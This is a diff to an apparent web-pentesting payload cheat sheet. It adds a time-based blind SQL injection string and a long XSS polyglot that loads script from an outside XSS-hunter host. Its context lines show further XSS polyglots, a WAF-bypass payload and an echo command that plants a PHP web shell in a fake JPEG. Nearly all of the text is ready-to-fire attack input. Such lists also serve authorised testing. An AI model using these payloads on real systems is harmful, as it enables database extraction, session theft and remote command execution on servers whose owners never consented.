@@ -8,6 +8,7 @@ Login and register payloads:
 
 Sql injection:
 (select(0)from(select(sleep(25)))v) --> Blind 25 seconds
+/0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z/ --> Time based 10 seconds
 
 
 
@@ -25,6 +26,9 @@ html injection(Can use match and replace in request body):
 
 -------------
 XSS:
+
+https://netsec.expert/posts/xss-in-2021/
+
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 
 %3c<aa+ONLOAD+href=javasONLOADcript:promptONLOAD(1)%3e --> WAF BYPASS
@@ -40,7 +44,7 @@ xss payload --> xss.xml:
 Double quote and single quote bypass:
 <xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
 
-
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//zaggeb.xSs.ht></scripT>
 ------
 RCE payload to creating image:
 echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > shell.jpg
